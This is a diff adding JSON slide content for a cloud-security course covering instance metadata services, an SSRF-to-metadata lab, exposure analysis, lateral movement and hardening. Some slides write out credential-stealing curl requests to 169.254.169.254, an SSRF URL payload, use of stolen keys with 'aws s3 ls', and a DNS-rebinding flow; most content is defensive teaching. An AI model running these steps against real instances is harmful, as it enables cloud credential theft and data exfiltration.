+            "body": "From inside an instance, the full IMDSv2 dance is three steps: get a token, list the role, then pull its credentials. The returned JSON is a working AWS credential set — valid for a few hours and usable from anywhere until it expires.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')",
+                  "output": ""
+                },
+                {
+                  "command": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "output": "web-app-instance-role"
+                },
+                {
+                  "command": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-instance-role",
+                  "output": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"wJal...\",\"Token\":\"IQoJb3...\",\"Expiration\":\"2026-11-16T22:00:00Z\"}"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Other Clouds: Azure and GCP",
+            "body": "The pattern is universal, though the details differ. Azure's IMDS is also at 169.254.169.254 but under /metadata/, and it requires a header 'Metadata: true' on every request (a small built-in defense against the most naive SSRF). Managed-identity tokens come from /metadata/identity/oauth2/token.\n\nGoogle Cloud uses the hostname metadata.google.internal (169.254.169.254) under /computeMetadata/v1/ and requires the header 'Metadata-Flavor: Google'. Service-account tokens live at /instance/service-accounts/default/token. The header requirement on Azure and GCP is why pure-GET SSRF sometimes fails there but succeeds against an AWS instance still on IMDSv1.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "169.254.169.254/latest/meta-data/",
+                    "IMDSv1: no header; IMDSv2: token",
+                    "iam/security-credentials/<role>"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "169.254.169.254/metadata/",
+                    "Header: Metadata: true (required)",
+                    "identity/oauth2/token"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "metadata.google.internal/computeMetadata/v1/",
+                    "Header: Metadata-Flavor: Google",
+                    "service-accounts/default/token"
+                  ],
+                  "highlighted": false
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "IMDS is the hinge of cloud attacks. The credentials it hands out are not low-value — they are whatever the instance's role can do, which in careless setups is a lot. Reaching IMDS converts any bug that makes a server fetch a URL into theft of real, usable cloud credentials.\n\nTwo takeaways for the rest of the module. Offensively: if you find a way to make a workload talk to 169.254.169.254, you are one step from account access. Defensively: enforcing IMDSv2 with hop-limit 1 is one of the highest-leverage controls in all of cloud security, and it is a single setting per instance."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m7-3",
+        "moduleId": "cloud-m7",
+        "number": 42,
+        "title": "SSRF-to-Metadata Exploitation",
+        "type": "lab",
+        "week": 3,
+        "description": "The headline chain, performed end to end against a vulnerable lab app. Students pivot from a web SSRF to cloud account access.",
+        "keyPoints": [
+          "Find SSRF in an app (URL fetchers, webhooks, PDF/image processors, open redirects)",
+          "Point SSRF at 169.254.169.254 and read the role name then its credentials",
+          "Use the stolen credentials with the AWS CLI to enumerate and exfiltrate",
+          "Why IMDSv1 makes this trivial and IMDSv2's PUT-token + hop-limit blocks naive SSRF",
+          "The Capital One 2019 breach as the canonical real-world instance of this chain"
+        ],
+        "slides": [
+          {
+            "title": "What SSRF Is",
+            "body": "Server-Side Request Forgery (SSRF) is a bug where you trick a server into making a network request for you, to a destination you choose. The server becomes your proxy.\n\nAnalogy: you cannot walk into a company's locked mailroom, but you can hand the clerk an address and say 'please go fetch whatever is there and read it back to me.' If the clerk does it without checking, you can point them at internal documents you were never allowed to see. In a web app, the 'clerk' is any feature that takes a URL and fetches it: a link-preview generator, a webhook caller, a PDF or image processor, an avatar-from-URL uploader. SSRF alone is interesting; SSRF pointed at the metadata service is a breach."
+          },
+          {
+            "title": "Why SSRF + Metadata = Disaster",
+            "body": "Recall two facts from the last topic. One: the metadata service at 169.254.169.254 trusts any request coming from the instance. Two: it hands out the instance role's live credentials.\n\nSSRF gives the attacker exactly the missing piece — a request that originates from inside the instance. The vulnerable server makes the fetch, so to IMDS it looks local and trusted. The attacker never touches 169.254.169.254 directly; the victim server does it for them and returns the answer. That is how a bug in a web form three layers up becomes AWS account access.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Attacker",
+                  "detail": "controls a URL field in the app"
+                },
+                {
+                  "label": "Vulnerable server",
+                  "detail": "fetches the attacker's URL = SSRF"
+                },
+                {
+                  "label": "URL = 169.254.169.254",
+                  "detail": "request now looks 'local'"
+                },
+                {
+                  "label": "IMDS returns role creds",
+                  "detail": "server relays them to attacker"
+                },
+                {
+                  "label": "Cloud account access",
+                  "detail": "attacker uses the keys"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Finding the SSRF",
+            "body": "Before you can chain, you need the SSRF. Look for any feature where the app takes a URL (or something that becomes one) and fetches it server-side:\n\n- URL fetchers / link unfurlers ('paste a link, we'll preview it')\n- Webhook configuration ('we'll POST events to your endpoint')\n- Document/PDF/image processors that pull remote resources\n- 'Import from URL' or 'avatar from URL' uploads\n- Open redirects you can stack in front of a fetcher to dodge filters\n\nTest by pointing the field at a server you control and watching for the inbound request. If the app's backend connects to you, it will connect to 169.254.169.254 too — unless something blocks it."
+          },
+          {
+            "title": "The Chain, Step by Step",
+            "body": "The end-to-end attack is four moves. First, confirm SSRF by making the server fetch your collaborator URL. Second, re-point it at the metadata role path to learn the role name. Third, fetch the credentials path to pull the keys. Fourth, load those keys into the AWS CLI and act with the role's permissions. Each step is a single request; the whole thing can take under a minute against an IMDSv1 instance.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "1. Confirm SSRF",
+                  "detail": "fetch http://your-collab/ , see the hit"
+                },
+                {
+                  "label": "2. List role",
+                  "detail": "fetch .../iam/security-credentials/"
+                },
+                {
+                  "label": "3. Steal keys",
+                  "detail": "fetch .../security-credentials/<role>"
+                },
+                {
+                  "label": "4. Use keys",
+                  "detail": "aws s3 ls with the stolen creds"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: SSRF to S3",
+            "body": "The attacker submits a URL parameter that the server dutifully fetches. Pointed at the metadata credentials path, the SSRF response body contains the keys. Those keys are exported and used with the AWS CLI to enumerate — here, listing S3 buckets the role can see. This is the exact shape of the Capital One breach, reproduced in the lab.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker",
+              "rightLabel": "Vulnerable app",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "SSRF request",
+                  "payload": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
+                },
+                {
+                  "direction": "left",
+                  "label": "App relays IMDS response",
+                  "payload": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"wJal...\",\"Token\":\"IQoJb3...\"}"
+                },
+                {
+                  "direction": "right",
+                  "label": "Attacker uses keys locally",
+                  "payload": "export AWS_ACCESS_KEY_ID=ASIA... ; aws s3 ls"
+                },
+                {
+                  "direction": "left",
+                  "label": "AWS answers to the stolen role",
+                  "payload": "2026-03-01 customer-data-prod\\n2026-03-01 backups-prod"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Nuance: When IMDSv2 Gets in the Way",
+            "body": "If the target enforces IMDSv2, the naive GET chain fails: the credentials path without a token returns 401 Unauthorized. To succeed, the SSRF would need to make a PUT to /latest/api/token and then send the returned token as a custom header on the next GET — two things most SSRF primitives cannot do.\n\nSo your SSRF capability matters. A full request-smuggling or 'fetch any method with any header' primitive might still beat IMDSv2; a plain 'fetch this GET URL' primitive will not. Also watch the hop limit: if the request is proxied (an extra network hop), hop-limit 1 drops it even if the headers are right. Knowing which case you're in tells you whether to keep pushing or pivot.",
+            "check": {
+              "question": "Your SSRF can only make the server perform a plain GET of a URL, with no control over the HTTP method or headers. The target enforces IMDSv2. What happens when you point it at the credentials path?",
+              "options": [
+                "It still works — IMDSv2 only protects the token endpoint",
+                "It fails: without a PUT to get a token and the token header on the GET, IMDSv2 returns 401",
+                "It works but returns the credentials encrypted",
+                "It triggers an immediate account lockout"
+              ],
+              "correctIndex": 1,
+              "explanation": "IMDSv2 requires a prior PUT for a session token and that token on every GET. A pure-GET SSRF cannot perform the PUT or set the custom header, so the credentials request is rejected with 401. This is precisely why IMDSv2 breaks the naive chain."
+            }
+          },
+          {
+            "title": "Case Study: Capital One, 2019",
+            "body": "This chain is not theoretical. In 2019, an attacker exploited an SSRF in a misconfigured web application firewall (ModSecurity) running on an EC2 instance at Capital One. The instance used IMDSv1. The SSRF fetched the role credentials from 169.254.169.254, and because that WAF role had broad S3 permissions, the attacker listed and copied roughly 100 million customer records out of S3.\n\nEvery link in the chain here is one you will reproduce in the lab: an SSRF, an IMDSv1 metadata read, over-broad role permissions, and S3 exfiltration. The breach is the canonical reason IMDSv2 exists and why 'enforce IMDSv2' is step one of cloud hardening."
+          },
+          {
+            "title": "Do It, and the Fix That Breaks It",
+            "body": "In the module lab 'SSRF to Cloud Takeover,' you run this end to end: find the SSRF in a local vulnerable app, pivot it to the metadata service, steal the EC2 role credentials, and use them to list an S3 bucket — the Capital One pattern on your own sandbox.\n\nThen comes the defense. The primary fix is enforcing IMDSv2 with hop-limit 1 (the next-but-one topic). Supporting controls: give the instance role least privilege (so stolen keys do little), and block or egress-filter so the app server cannot freely reach link-local addresses. In the follow-up lab 'Break It with IMDSv2,' you flip the instance to IMDSv2 and confirm your own exploit now returns 401 instead of credentials."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m7-4",
+        "moduleId": "cloud-m7",
+        "number": 43,
+        "title": "Exposure & Attack-Surface Analysis",
+        "type": "lab",
+        "week": 3,
+        "description": "Finding what's reachable from the internet. Students enumerate public endpoints and over-broad security groups across an account.",
+        "keyPoints": [
+          "Security groups open to 0.0.0.0/0 on SSH/RDP/DB ports",
+          "Public IPs, exposed ALBs/NLBs, API Gateway, and open databases",
+          "Prowler / ScoutSuite network checks; aws ec2 describe-security-groups parsing",
+          "Reachability analysis with VPC Reachability Analyzer",
+          "Shadow exposure via misconfigured NACLs and peering"
+        ],
+        "slides": [
+          {
+            "title": "What Exposure Analysis Is",
+            "body": "Exposure analysis answers one question: what can an attacker on the internet actually reach in this account? Before chaining clever exploits, you map the open doors.\n\nAnalogy: a security guard walking the perimeter of a building at night, trying every door and window and writing down which ones are unlocked. You are not picking locks yet — you are inventorying what is already open. In the cloud, the 'doors' are public IPs, load balancers, API gateways, and the security-group rules that decide which ports accept connections from the world. Most real incidents start at a door someone forgot to lock, not at a sophisticated exploit."
+          },
+          {
+            "title": "The Usual Suspects",
+            "body": "A handful of misconfigurations account for most internet exposure:\n\n- Security groups allowing 0.0.0.0/0 (the entire internet) on sensitive ports: 22 (SSH), 3389 (RDP), 3306 (MySQL), 5432 (Postgres), 6379 (Redis), 27017 (MongoDB).\n- Databases and caches given public IPs that should have stayed private.\n- Management interfaces and admin panels reachable without a VPN.\n\nThe pattern to internalize: management and data ports open to the world are almost never intentional. An SSH port open to 0.0.0.0/0 is a standing invitation to credential-stuffing and exploitation.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Dangerous (open to 0.0.0.0/0)",
+                  "points": [
+                    "22 SSH / 3389 RDP to world",
+                    "3306 / 5432 / 27017 DB to world",
+                    "6379 Redis (often no auth) to world",
+                    "Admin panels with no VPN"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Acceptable",
+                  "points": [
+                    "443 HTTPS on a public ALB",
+                    "80 -> redirect to 443",
+                    "SSH restricted to a bastion/CIDR",
+                    "DB ports open only to the app SG"
+                  ],
+                  "highlighted": false
+                }
+              ]
+            }
+          },
+          {
+            "title": "Beyond Security Groups",
+            "body": "Exposure is more than open ports. A public IP on an instance, an internet-facing Application or Network Load Balancer (ALB/NLB), an API Gateway endpoint, or an S3 bucket with public policy all widen the surface.\n\nAnd exposure is a path, not a single setting: a resource is reachable only if every layer along the way allows it — route table (is the subnet public?), security group (is the port open?), and NACL (does the subnet-level filter permit it?). A database might have a wide-open security group but sit in a private subnet with no internet route, making it unreachable from outside. True exposure analysis checks the whole path, not one rule in isolation.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Internet",
+                  "detail": "attacker source"
+                },
+                {
+                  "label": "Public subnet route?",
+                  "detail": "0.0.0.0/0 -> IGW must exist"
+                },
+                {
+                  "label": "NACL allows port?",
+                  "detail": "subnet-level allow"
+                },
+                {
+                  "label": "Security group allows?",
+                  "detail": "instance-level allow"
+                },
+                {
+                  "label": "Service listening?",
+                  "detail": "only then is it exposed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Finding Open Ports",
+            "body": "You can parse exposure straight from the AWS API. This query flags every security group with a rule open to 0.0.0.0/0, showing the ports. Two findings surface here: SSH and Postgres, both open to the entire internet. In practice you'd run this across all regions, because resources hide in regions nobody remembers enabling.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 describe-security-groups --profile technieum --query \"SecurityGroups[?IpPermissions[?contains(IpRanges[].CidrIp, '0.0.0.0/0')]].{Name:GroupName,Ports:IpPermissions[].FromPort}\"",
+                  "output": "[{\"Name\":\"web-sg\",\"Ports\":[443,22]},{\"Name\":\"db-sg\",\"Ports\":[5432]}]"
+                },
+                {
+                  "command": "# 22 (SSH) and 5432 (Postgres) open to the world -> findings",
+                  "output": ""
+                }
+              ]
+            },
+            "check": {
+              "question": "A Postgres instance has a security group allowing 5432 from 0.0.0.0/0, but it sits in a private subnet whose route table has no 0.0.0.0/0 route. Is it exposed to the internet?",
+              "options": [
+                "Yes — an open security group always means internet-reachable",
+                "No — with no internet route to the subnet, there is no path in; exposure is a whole-path property",
+                "Only if a NACL explicitly denies it",
+                "Yes, but only from other AWS accounts"
+              ],
+              "correctIndex": 1,
+              "explanation": "Reachability requires every layer to permit the path. An open security group is necessary but not sufficient; without a public route to the subnet, no internet traffic can arrive. This is why exposure analysis evaluates route table + NACL + security group together, not one rule alone."
+            }
+          },
+          {
+            "title": "Tools of the Trade",
+            "body": "Doing this by hand across regions and accounts doesn't scale. Three categories of tooling help:\n\n- Posture scanners: Prowler and ScoutSuite run hundreds of checks, including 'SG open to 0.0.0.0/0 on admin ports' and 'public RDS instance.' They produce a prioritized report in minutes.\n- Native reachability: AWS VPC Reachability Analyzer traces whether a specific source can actually reach a destination through all the routing and filtering layers — ground truth, not guesswork.\n- Raw API parsing: aws ec2 describe-security-groups piped through jq for custom checks the scanners miss.\n\nUse scanners for breadth, Reachability Analyzer for proving a specific path."
+          },
+          {
+            "title": "Shadow Exposure",
+            "body": "The dangerous exposures are the ones your mental model misses. A NACL with an overly broad allow can undo the segmentation a security group implies. A VPC peering or Transit Gateway attachment can make a 'private' resource reachable from a partner VPC — and from anything that compromises that partner. An ALB in a public subnet can forward to targets you assumed were internal.\n\nThese are 'shadow' exposures: reachable by a path nobody drew on the architecture diagram. Finding them is exactly where Reachability Analyzer earns its keep — it follows the real routing graph, including peering and endpoints, instead of trusting labels."
+          },
+          {
+            "title": "Do It: The Expose Audit",
+            "body": "In the module lab 'Expose Audit,' you point Prowler at a sandbox account, enumerate every internet-reachable port and over-broad security group, and remediate each to least privilege. Concretely: replace 0.0.0.0/0 on SSH with a bastion CIDR or SSM-only access, scope database ports to the app's security group instead of the world, and move resources that never need public access into private subnets.\n\nThe deliverable is a before/after: a list of exposed services, the specific rule that exposed each, and the tightened rule that closes it. That artifact is also what a real cloud-security finding looks like."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Exposure analysis is the cheapest, highest-return work in cloud security. Every exploit chain in this track — SSRF, lateral movement, data theft — needs a reachable entry point. Shrink the attack surface and you cut off whole classes of attack before they start.\n\nIt is also continuous, not one-time. Cloud environments change daily: a developer opens a port 'just to debug,' a new service gets a public IP, a peering link is added. Treat exposure analysis as a recurring scan (Prowler on a schedule, config rules that alert on 0.0.0.0/0 admin ports) rather than a single audit, and the surface stays small."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m7-5",
+        "moduleId": "cloud-m7",
+        "number": 44,
+        "title": "Network-Based Lateral Movement",
+        "type": "theory",
+        "week": 3,
+        "description": "Once inside the network, how an attacker moves. Flat networks and permissive internal rules let a single foothold reach everything.",
+        "keyPoints": [
+          "East-west movement across over-connected subnets and peered VPCs",
+          "Reaching internal databases, caches and admin panels from a compromised host",
+          "Abusing VPC endpoints and PrivateLink trust",
+          "DNS rebinding and internal service discovery",
+          "Pivoting via compromised bastion/jump hosts"
+        ],
+        "slides": [
+          {
+            "title": "What Lateral Movement Is",
+            "body": "Lateral movement is what an attacker does after the first foothold: spreading from the one host they compromised to reach the things they actually want — databases, admin panels, other services.\n\nAnalogy: a burglar who climbs through one unlocked window. The break-in is just the start. What determines the damage is how many internal doors are unlocked once they're inside. A house with every interior door open lets them reach the safe; a house where each room is separately locked contains them to one room. Cloud networks are the same: the question is not only 'can they get in?' but 'once in, how far can they go?'"
+          },
+          {
+            "title": "East-West vs North-South",
+            "body": "Security people split traffic into two directions. North-south is traffic crossing the perimeter — internet to your app. East-west is traffic between your internal resources — app to database, service to service.\n\nMost defenses focus on north-south (firewalls, WAFs at the edge). Attackers exploit the soft east-west interior: once inside, they move between hosts that trust each other implicitly. In a flat network — one big subnet, or many subnets wired together with permissive rules — a single compromised instance can open connections to everything. The whole discipline of segmentation exists to make east-west movement hard.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "North-South (perimeter)",
+                  "points": [
+                    "Internet <-> your app",
+                    "Heavily defended: WAF, edge firewall",
+                    "What most monitoring watches"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "East-West (internal)",
+                  "points": [
+                    "Service <-> service, host <-> DB",
+                    "Often implicitly trusted",
+                    "Where lateral movement happens",
+                    "The soft underbelly attackers abuse"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Reaching the Good Stuff",
+            "body": "From a compromised web server, the attacker's first move is to scan the internal network for valuable, often-unauthenticated targets:\n\n- Databases (Postgres, MySQL, MongoDB) reachable on the internal network, sometimes with weak or default credentials.\n- Caches like Redis and Memcached, which historically ship with no authentication at all.\n- Internal admin panels, dashboards, and CI/CD systems assumed to be 'safe because internal.'\n\nIn a flat network these are all one internal connection away. The lesson: internal does not mean trusted. Every internal service should authenticate and should only accept connections from the specific sources that need it.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "web",
+                  "label": "Compromised web server",
+                  "highlighted": true
+                },
+                {
+                  "id": "db",
+                  "label": "Internal Postgres"
+                },
+                {
+                  "id": "redis",
+                  "label": "Redis (no auth)"
+                },
+                {
+                  "id": "admin",
+                  "label": "Internal admin panel"
+                },
+                {
+                  "id": "ci",
+                  "label": "CI/CD runner"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "web",
+                  "to": "db",
+                  "label": "flat network = reachable"
+                },
+                {
+                  "from": "web",
+                  "to": "redis",
+                  "label": "no auth = instant access"
+                },
+                {
+                  "from": "web",
+                  "to": "admin",
+                  "label": "'internal = trusted'"
+                },
+                {
+                  "from": "web",
+                  "to": "ci",
+                  "label": "pivot to pipeline"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Abusing VPC Endpoints and PrivateLink",
+            "body": "VPC endpoints (from the first topic) create private, trusted paths to AWS services and partner services. That trust can be abused. If a compromised host sits in a subnet with a Gateway endpoint to S3, the attacker can reach S3 privately — and any over-broad endpoint policy applies to them too. PrivateLink connections to partner VPCs extend trust across organizational boundaries; compromising one side can open a path to the other.\n\nThe takeaway: endpoints are trust relationships. When you map an environment for lateral movement, include the endpoint and PrivateLink graph, not just subnets and security groups. An endpoint policy that is wide open is a lateral-movement highway."
+          },
+          {
+            "title": "DNS Rebinding and Service Discovery",
+            "body": "Two techniques help an attacker navigate an internal network. Service discovery: internal DNS (Route 53 private zones, Kubernetes service DNS, Consul) is a map of what exists — querying it reveals database and service hostnames to aim at. Attackers enumerate it immediately.\n\nDNS rebinding is sneakier. The attacker controls a domain whose DNS answer changes between the security check and the actual request: it first resolves to a harmless public IP (passing an allowlist), then 're-binds' to an internal IP like 169.254.169.254 or a private database. It is a way to defeat naive SSRF filters that only check the hostname once. Short DNS TTLs make the swap fast.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "App checks attacker.com",
+                  "detail": "DNS -> 203.0.113.5 (public, allowed)"
+                },
+                {
+                  "label": "Filter passes",
+                  "detail": "'looks external, fine'"
+                },
+                {
+                  "label": "TTL expires, re-resolve",
+                  "detail": "DNS now -> 169.254.169.254"
+                },
+                {
+                  "label": "App fetches internal target",
+                  "detail": "same hostname, internal IP"
+                }
+              ]
+            },
+            "check": {
+              "question": "How does DNS rebinding defeat an SSRF filter that blocks internal IPs by checking the hostname's resolved address?",
+              "options": [
+                "It encrypts the DNS query so the filter can't read it",
+                "The domain resolves to an allowed public IP during the check, then re-resolves to an internal IP for the actual request",
+                "It brute-forces the internal IP range",
+                "It disables the DNS server entirely"
+              ],
+              "correctIndex": 1,
+              "explanation": "DNS rebinding exploits the time gap between validation and use. The attacker's domain first answers with a public IP (passing the check), then changes its DNS answer (short TTL) to an internal IP before the server makes the real request. The defense is to resolve once and connect to that exact resolved IP, and to block link-local/private ranges."
+            }
+          },
+          {
+            "title": "Pivoting via Bastions and Jump Hosts",
+            "body": "Bastion (jump) hosts are deliberately placed at the boundary so admins can reach private resources through one controlled, logged entry point. That makes them a prime pivot target: compromise the bastion and you inherit its reach into the private network by design.\n\nSame for any dual-homed host — one with a foot in two networks (a build server that touches both the DMZ and the internal subnet, for example). Attackers hunt for these connective hosts precisely because they bridge segments. When you harden, the bastion needs the strictest controls of anything: MFA, session logging, tight egress, and ideally replacement by agent-based access (AWS SSM Session Manager) that removes the standing SSH door altogether."
+          },
+          {
+            "title": "How to Spot and Test It",
+            "body": "To assess lateral-movement risk, think in reachability, not inventory. Pick a likely-first-compromise host (a public web server) and ask: from here, what can I connect to? Use VPC Reachability Analyzer to prove paths, or from a test instance run a port sweep of the internal ranges to see what answers.\n\nRed flags: security groups that reference broad CIDRs (10.0.0.0/8) instead of specific source groups; databases accepting connections from the whole VPC; Redis/Memcached with no auth; flat subnets with no internal segmentation; permissive peering or endpoint policies. Each 'yes, that's reachable' is a segment you should break."
+          },
+          {
+            "title": "Defend and Why It Matters",
+            "body": "Containment turns a single compromise into a non-event. The core controls: micro-segmentation (security groups that allow only the specific source group and port each service needs, never broad CIDRs), private subnets for anything not public, authentication on every internal service (no unauthenticated Redis), egress filtering so a compromised host can't freely scan or exfiltrate, and strict bastion controls.\n\nWhy it matters: perfect perimeter security is impossible — eventually something gets a foothold. Lateral-movement defense is the assumption-of-breach layer that decides whether that foothold stays a contained incident or becomes a full breach. It is the difference between 'one server was compromised' and 'the company was.'"
+          }
+        ]
+      },
+      {
+        "id": "cloud-m7-6",
+        "moduleId": "cloud-m7",
+        "number": 45,
+        "title": "Hardening the Network & Metadata",
+        "type": "exercise",
+        "week": 3,
+        "description": "Closing the chains built above. Students enforce IMDSv2, segment the network and restrict egress, then re-run their SSRF exploit to confirm it fails.",
+        "keyPoints": [
+          "Enforce IMDSv2 and set hop-limit=1 account-wide (and block IMDS entirely where unused)",
+          "Micro-segmentation: least-privilege security groups, private subnets, no 0.0.0.0/0",
+          "Egress filtering so a compromised host can't exfil freely",
+          "VPC endpoints to keep AWS API traffic off the internet",
+          "GuardDuty detections for metadata-credential exfil (InstanceCredentialExfiltration)"
+        ],
+        "slides": [
+          {
+            "title": "What We're Hardening",
+            "body": "This topic closes every chain built earlier. You proved SSRF can steal metadata credentials, that over-broad security groups expose services, and that flat networks let one foothold spread. Now you break each of those on purpose.\n\nThe plan is four layers, in priority order: enforce IMDSv2 so SSRF can't steal credentials; micro-segment the network so a foothold can't spread; filter egress so a compromised host can't exfiltrate; and add detection so credential theft that does happen is caught. The final test is objective — re-run your own SSRF exploit and confirm it now fails.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Enforce IMDSv2",
+                  "detail": "kills the SSRF-to-creds chain"
+                },
+                {
+                  "label": "Micro-segment",
+                  "detail": "limits lateral movement"
+                },
+                {
+                  "label": "Egress filtering",
+                  "detail": "stops free exfiltration"
+                },
+                {
+                  "label": "Detect (GuardDuty)",
+                  "detail": "catch what slips through"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Enforce IMDSv2 with Hop-Limit 1",
+            "body": "The single highest-leverage control. Setting the instance metadata options to require IMDSv2 (HttpTokens=required) means every metadata read now needs a session token obtained via PUT — which naive SSRF cannot do. Setting the hop limit to 1 means a request that crossed an extra network hop (as proxied/containerized SSRF often does) has its packet TTL decremented to zero and dropped.\n\nWhere the instance role is never used, go further and disable IMDS entirely (HttpEndpoint=disabled). Apply it account-wide: new instances can default to IMDSv2 via an account setting, and existing instances are updated with modify-instance-metadata-options. This is a configuration change, not a code change — which is why it's the first thing to fix.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 modify-instance-metadata-options --instance-id i-0abc123 --http-tokens required --http-put-response-hop-limit 1 --http-endpoint enabled --profile technieum",
+                  "output": "{ \"InstanceId\": \"i-0abc123\", \"InstanceMetadataOptions\": { \"State\": \"pending\", \"HttpTokens\": \"required\", \"HttpPutResponseHopLimit\": 1 } }"
+                },
+                {
+                  "command": "# verify the old IMDSv1 GET now fails from the instance:",
+                  "output": ""
+                },
+                {
+                  "command": "curl -s -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "output": "401"
+                }
+              ]
+            },
+            "check": {
+              "question": "Setting the IMDS hop limit to 1 adds what specific protection beyond requiring tokens?",
+              "options": [
+                "It encrypts the credentials returned by IMDS",
+                "It drops metadata requests that traversed an extra network hop (e.g., proxied or container-forwarded), since the packet TTL reaches zero",
+                "It rotates the instance role every hour",
+                "It blocks all outbound internet traffic from the instance"
+              ],
+              "correctIndex": 1,
+              "explanation": "The hop limit caps how many network hops the IMDS response packet can travel. With a limit of 1, a request forwarded through an extra hop (common with proxies or container networking) is dropped — a second barrier on top of the token requirement, aimed at SSRF that relays through another component."
+            }
+          },
+          {
+            "title": "Micro-Segmentation",
+            "body": "Segmentation limits how far a foothold spreads. The rules:\n\n- Least-privilege security groups: a service's SG should allow only the specific source security group and port it needs — e.g., the database SG allows 5432 only from the app SG, never from a CIDR, never from the world.\n- Private subnets for everything that doesn't need to be public. Databases, caches, and internal services get no public route.\n- No 0.0.0.0/0 on management or data ports, ever. Replace SSH-from-world with a bastion CIDR or, better, SSM Session Manager (no open port at all).\n\nReference source groups, not IP ranges, so the rules stay tight even as instances come and go.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Flat / over-broad (before)",
+                  "points": [
+                    "DB SG allows 5432 from 10.0.0.0/8",
+                    "SSH from 0.0.0.0/0",
+                    "Everything in one subnet",
+                    "One foothold reaches all"
+                  ],
+                  "highlighted": false
+                },
+                {
+                  "label": "Micro-segmented (after)",
+                  "points": [
+                    "DB SG allows 5432 from app-SG only",
+                    "SSH via SSM / bastion CIDR",
+                    "Private subnets for DB and internal svcs",
+                    "Foothold is contained"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Egress Filtering",
+            "body": "Most teams tightly control what comes in and ignore what goes out. But exfiltration and credential-beaconing are outbound. Default-open egress means a compromised host can send your data anywhere and pull down more tooling freely.\n\nTighten it: security groups and NACLs should restrict outbound traffic to only what the workload legitimately needs (specific endpoints, your package mirror, AWS service ranges). Route AWS API calls through VPC endpoints so that traffic never needs an internet path at all. With egress locked down, even an attacker who gets code execution struggles to get the data out — and their outbound attempts become loud, detectable anomalies."
+          },
+          {
+            "title": "VPC Endpoints to Keep Traffic Private",
+            "body": "A supporting control that pairs with egress filtering: use VPC endpoints so your instances reach AWS services (S3, Secrets Manager, STS, etc.) over AWS's private network instead of the public internet. This lets you remove broad outbound internet rules entirely for workloads that only talk to AWS.\n\nTwo security wins. First, sensitive API traffic never touches the internet, shrinking exposure. Second, you can attach endpoint policies that restrict which buckets or services the endpoint may reach, and even require traffic to come through the endpoint — so stolen credentials used from outside the VPC may be blocked by condition keys like aws:sourceVpce. Private by default, with a policy choke point."
+          },
+          {
+            "title": "Detection: GuardDuty",
+            "body": "Prevention can fail, so you also want to know when metadata credentials are stolen and used. Amazon GuardDuty has a purpose-built finding for exactly this chain: InstanceCredentialExfiltration. It fires when credentials created for an EC2 instance role are used from outside that instance — for example, from an attacker's laptop or a different AWS account.\n\nThe variants matter: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (used from an external IP) and .InsideAWS (used from a different AWS account). Wire these findings to an alert and an automated response — revoke the session, quarantine the instance. This is the safety net under IMDSv2: if a sophisticated SSRF still steals creds, their use lights up immediately.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Instance role creds issued",
+                  "detail": "bound to i-0abc123"
+                },
+                {
+                  "label": "Creds used off-instance",
+                  "detail": "attacker laptop / other account"
+                },
+                {
+                  "label": "GuardDuty detects",
+                  "detail": "InstanceCredentialExfiltration finding"
+                },
+                {
+                  "label": "Automated response",
+                  "detail": "revoke session, isolate host"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Re-Run the Exploit",
